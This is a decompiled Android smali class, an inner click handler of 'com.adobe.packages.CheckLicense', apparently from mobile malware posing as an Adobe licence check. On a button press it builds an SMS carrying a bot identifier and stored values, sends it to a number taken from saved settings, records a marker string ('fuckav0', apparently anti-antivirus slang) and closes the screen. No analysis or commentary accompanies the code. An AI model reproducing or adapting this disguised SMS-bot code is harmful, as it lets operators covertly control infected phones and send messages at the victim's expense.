.class Lcom/adobe/packages/CheckLicense$1;
.super Ljava/lang/Object;
.source "CheckLicense.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/adobe/packages/CheckLicense;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/adobe/packages/CheckLicense;

.field private final synthetic val$BotID:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/adobe/packages/CheckLicense;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/adobe/packages/CheckLicense$1;->this$0:Lcom/adobe/packages/CheckLicense;

    iput-object p2, p0, Lcom/adobe/packages/CheckLicense$1;->val$BotID:Ljava/lang/String;

    .line 81
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 6
    .param p1, "arg0"    # Landroid/view/View;

    .prologue
    .line 85
    iget-object v0, p0, Lcom/adobe/packages/CheckLicense$1;->this$0:Lcom/adobe/packages/CheckLicense;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "+"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/adobe/packages/CheckLicense$1;->this$0:Lcom/adobe/packages/CheckLicense;

    const-string v3, "pm_setts"

    iget-object v4, p0, Lcom/adobe/packages/CheckLicense$1;->this$0:Lcom/adobe/packages/CheckLicense;

    invoke-virtual {v4}, Lcom/adobe/packages/CheckLicense;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-static {v2, v3, v4}, Lcom/adobe/packages/CheckLicense;->access$0(Lcom/adobe/packages/CheckLicense;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "PM?"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/adobe/packages/CheckLicense$1;->val$BotID:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "?"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/adobe/packages/CheckLicense$1;->this$0:Lcom/adobe/packages/CheckLicense;

    const-string v4, "pmfk"

    iget-object v5, p0, Lcom/adobe/packages/CheckLicense$1;->this$0:Lcom/adobe/packages/CheckLicense;

    invoke-virtual {v5}, Lcom/adobe/packages/CheckLicense;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-static {v3, v4, v5}, Lcom/adobe/packages/CheckLicense;->access$0(Lcom/adobe/packages/CheckLicense;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcom/adobe/packages/CheckLicense;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 87
    iget-object v0, p0, Lcom/adobe/packages/CheckLicense$1;->this$0:Lcom/adobe/packages/CheckLicense;

    const-string v1, "pmfkz"

    const-string v2, "fuckav0"

    iget-object v3, p0, Lcom/adobe/packages/CheckLicense$1;->this$0:Lcom/adobe/packages/CheckLicense;

    invoke-virtual {v3}, Lcom/adobe/packages/CheckLicense;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/adobe/packages/CheckLicense;->access$1(Lcom/adobe/packages/CheckLicense;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 88
    iget-object v0, p0, Lcom/adobe/packages/CheckLicense$1;->this$0:Lcom/adobe/packages/CheckLicense;

    invoke-virtual {v0}, Lcom/adobe/packages/CheckLicense;->finish()V

    .line 89
    return-void
.end method
